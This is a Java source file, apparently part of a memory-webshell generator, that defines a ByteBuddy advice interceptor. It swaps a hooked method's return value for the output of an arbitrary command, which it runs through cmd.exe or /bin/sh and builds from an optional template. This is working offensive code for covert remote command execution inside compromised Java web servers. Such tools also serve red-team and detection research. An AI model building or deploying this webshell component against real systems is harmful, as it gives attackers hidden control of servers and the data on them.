package com.reajason.javaweb.memshell.generator.command;

import net.bytebuddy.asm.Advice;
import org.apache.commons.io.IOUtils;

import java.io.IOException;
import java.io.InputStream;

/**
 * @author ReaJason
 * @since 2025/5/25
 */
public class RuntimeExecInterceptor {

    @Advice.OnMethodExit
    public static void enter(@Advice.Argument(value = 0) String cmd,
                             @Advice.Return(readOnly = false) InputStream returnValue,
                             @TemplateAnnotation String template
    ) throws IOException {
        String[] cmdarray = null;
        String t = template;
        if (t == null) {
            cmdarray = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
        } else {
            if (t.contains("\"{command}\"")) {
                String[] split = t.split("\\s+");
                for (int i = 0; i < split.length; i++) {
                    split[i] = split[i].replace("\"{command}\"", cmd);
                }
                cmdarray = split;
            } else {
                String cmdline = t.replace("{command}", cmd);
                cmdarray = cmdline.split("\\s+");
            }
        }
        returnValue = new ProcessBuilder(cmdarray).redirectErrorStream(true).start().getInputStream();
    }
}
